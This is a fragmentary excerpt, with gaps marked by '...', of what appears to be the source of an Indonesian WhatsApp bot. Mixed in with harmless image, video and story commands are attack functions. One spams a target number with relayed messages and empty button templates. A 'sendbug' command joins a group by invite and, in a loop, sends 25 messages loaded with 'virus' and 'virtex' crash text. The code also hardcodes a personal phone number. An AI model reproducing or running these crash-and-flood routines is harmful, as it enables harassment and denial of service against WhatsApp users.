danta.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
danta.relayMessage(numt, order.message, { messageId: order.key.id })
danta.relayMessage(numt, audio.message, { messageId: audio.key.id })
danta.relayMessage(numt, image.message, { messageId: image.key.id })
danta.relayMessage(numt, document.message, { messageId: document.key.id })
danta.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
danta.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
danta.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Danta ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Danta ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
danta.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'sendbug':{
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await danta.groupAcceptInvite(result)
danta.relayMessage(kir, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `Danta Dev ${virus}${virtex(prefix)}`, 
...
"name": `Danta Dev ${virus}`,
"address": `Created By Danta Dev ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
danta.relayMessage(kir, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
case '1917': 
case 'leaves': {
if (!q) return reply(`Example : ${prefix+command} danta`) 
let link
...
danta.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
...
danta.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
...
danta.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
}
break
...
danta.sendMessage(m.chat, buttonMessaage, { quoted: m })
}
break
case 'fox':  
case 'dog':  
...
danta.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
break
case 'jjmeryani':{
...
danta.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
}
break
case 'cerpen_anak':{
...
let e = String(err)
danta.sendMessage("6281356484612@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
